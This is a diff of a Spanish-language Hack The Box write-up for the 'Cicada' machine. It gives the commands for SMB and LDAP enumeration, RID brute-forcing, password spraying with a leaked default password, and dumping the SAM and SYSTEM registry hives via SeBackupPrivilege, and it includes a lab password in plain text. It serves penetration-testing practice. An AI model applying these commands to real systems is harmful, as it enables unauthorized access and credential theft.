@@ -10,7 +10,13 @@ IP 10.10.11.35
 
 La siguiente información trata sobre cómo vulnerar esta máquina de hack the box, para lo cual realizaremos los siguientes pasos
 
-1\) Para la enumeración de puertos me he ayudado de la herramienta nmap con el siguiente comando. sudo nmap -sC -O -Pn 10.10.11.35 Obteniendo a la salida
+1)  Para la enumeración de puertos me he ayudado de la herramienta nmap con el siguiente comando.
+
+    ``` {.shell .cmd}
+    sudo nmap -sC -O -Pn 10.10.11.35
+    ```
+
+    Obteniendo a la salida
 
 ![](imagenes/2.png){fig-align="center"}
 
@@ -18,7 +24,7 @@ Aquí se puede observar el listado de los puertos abiertos entre los cuales se e
 
 "El puerto 389 es el puerto predeterminado utilizado por el Protocolo de Acceso Ligero a Directorios (LDAP), en su forma sin cifrar. LDAP es un protocolo estándar para acceder y administrar servicios de directorios distribuidos en una red, como el Active Directory (AD) de Microsoft o servidores LDAP de código abierto como OpenLDAP."
 
-2\) Revisión del puerto 389 LDAP con la herramienta crackmapexec, para lo cual se utiliza el siguiente comando crackmapexec ldap 10.10.11.35 --users Teniendo como resultado lo siguiente:
+2)  Revisión del puerto 389 LDAP con la herramienta crackmapexec, para lo cual se utiliza el siguiente comando crackmapexec ldap 10.10.11.35 --users Teniendo como resultado lo siguiente:
 
 ![](imagenes/3.png){fig-align="center"}
 
@@ -26,13 +32,17 @@ Aquí se puede observar el listado de los puertos abiertos entre los cuales se e
 
 Con ese comando se puede observar que existen recursos compartidos en el dominio cicada.htb, pero no se ha podido enumerar dado que es un usuario anónimo, también podemos ver que utiliza el puerto 445 para compartir.
 
-3\) Se coloca usuarios por defecto para aprovechar una mala configuración como admin, como sabes que utiliza el servicio smb cambiamos el ldap.
+3)  Se coloca usuarios por defecto para aprovechar una mala configuración como admin, como sabes que utiliza el servicio smb cambiamos el ldap.
 
 ![](imagenes/5.png)
 
 Podemos conocer que existe un usuario admin
 
-4\) Ahora se puede enumerar los recursos compartidos con el comando crackmapexec smb 10.10.11.35 -d 'cicada.htb' -u admin -p "" --shares
+4)  Ahora se puede enumerar los recursos compartidos con el comando
+
+    ``` shell
+    crackmapexec smb 10.10.11.35 -d 'cicada.htb' -u admin -p "" –shares
+    ```
 
 ![](imagenes/6.png)
 
@@ -40,7 +50,9 @@ Podemos observar que en dos de esas carpetas HR y IPC\$ tenemos acceso de lectur
 
 5)  Usando la herramienta smbclient permite conectar con recursos compartidos, y ya que tenemos el usuario admin, con permiso de lectura podemos hacerlo haciendo uso del comando
 
-    smbclient -U 'admin' \\\\10.10.11.35\\HR
+    ``` shell
+    smbclient -U 'admin' \\10.10.11.35\HR
+    ```
 
 ![](imagenes/7.png){fig-align="center"}
 
@@ -52,7 +64,11 @@ La contraseña: Cicada\$M6Corpb\*@Lp#nZp!8
 
 6)  Tenemos la contraseña, pero al probar con el usuario admin no es su contraseña, por ende falta consultar todos los posibles usuarios que puedan conectarse, por lo que hacemos uso nuevamente de crackmapexe haciendo uso de un ataque de fuerza bruta a los RID(Relative Identifier)
 
-    CrackMapExec permite realizar un ataque a los RIDs para enumerar usuarios en un dominio. Aquí está el comando que puedes utilizar: crackmapexec smb 10.10.11.35 -d cicada.htb -u 'admin' -p '' --rid-brute
+    CrackMapExec permite realizar un ataque a los RIDs para enumerar usuarios en un dominio. Aquí está el comando que puedes utilizar:
+
+    ``` shell
+    crackmapexec smb 10.10.11.35 -d cicada.htb -u 'admin' -p '' –rid-brute
+    ```
 
     Teniendo como salida algunos usuarios, falta conocer cual usuario corresponde con la password
 
@@ -64,13 +80,25 @@ El diccionario quedaría como se muestra en la figura.
 
 ![](imagenes/10.png)
 
-7)  Con el comando crackmapexec smb 10.10.11.35 -d cicada.htb -u usuarios.txt -p pass.txt buscamos el usuario correspondiente mediante un ataque de diccionario. Dando como resultado el usuario que contiene esa password.
+7)  Con el comando
+
+    ``` shell
+    crackmapexec smb 10.10.11.35 -d cicada.htb -u usuarios.txt -p pass.txt
+    ```
+
+    buscamos el usuario correspondiente mediante un ataque de diccionario. Dando como resultado el usuario que contiene esa password.
 
     ![](imagenes/11.png)
 
 8)  Al estar utilizando el protocolo smb, podemos hacer uso de la herramienta enum4linux que permite obtener información en entornos de AD.
 
-    El comando enum4linux -a -u 'michael.wrightson' -p 'Cicada\$M6Corpb\*@Lp#nZp!8' 10.10.11.35 realiza una enumeración exhaustiva en un servidor SMB utilizando las credenciales proporcionadas para autenticar y obtener información como usuarios, grupos, recursos compartidos, políticas de contraseñas y detalles del dominio. Esto es útil para recopilar datos sensibles si las credenciales tienen permisos suficientes.
+    El comando:
+
+    ``` shell
+    enum4linux -a -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35
+    ```
+
+    realiza una enumeración exhaustiva en un servidor SMB utilizando las credenciales proporcionadas para autenticar y obtener información como usuarios, grupos, recursos compartidos, políticas de contraseñas y detalles del dominio. Esto es útil para recopilar datos sensibles si las credenciales tienen permisos suficientes.
 
 ![](imagenes/12.png)
 
@@ -113,9 +141,20 @@ o Descripción: Permite realizar copias de seguridad de archivos y directorios, 
 
 • SeIncreaseWorkingSetPrivilege: o Descripción: Permite aumentar el conjunto de trabajo (working set) de un proceso, lo que puede ser útil en operaciones que requieren más memoria. o Estado: Habilitado. Este privilegio es menos relevante para la explotación.
 
-Conociendo eso, ahora vamos a la carpeta config, con el comando cd C:\Windows\System32\\config ahora Podemos realizar una copia de los archivos SAM y SYSTEM que son utilizados para almacenar las contraseñas de los usuarios en Windows.
+Conociendo eso, ahora vamos a la carpeta config, con el comando
 
-No se puede utilizar el comando copy, porque no es en tiempo real, así que podemos utilizar el comando reg. reg save hklm\sam C:\Windows\Temp\sam y reg save hklm\system C:\Windows\Temp\system
+``` shell
+cd C:\Windows\System32\config
+```
+
+ahora Podemos realizar una copia de los archivos SAM y SYSTEM que son utilizados para almacenar las contraseñas de los usuarios en Windows.
+
+No se puede utilizar el comando copy, porque no es en tiempo real, así que podemos utilizar el comando reg.
+
+``` shell
+ reg save hklm\sam C:\Windows\Temp\sam
+ reg save hklm\system C:\Windows\Temp\system
+```
 
 14) Ahora que se encuentra en una carpeta a la cual tenemos acceso, podemos descargarlo o transferirlo con el comando
 
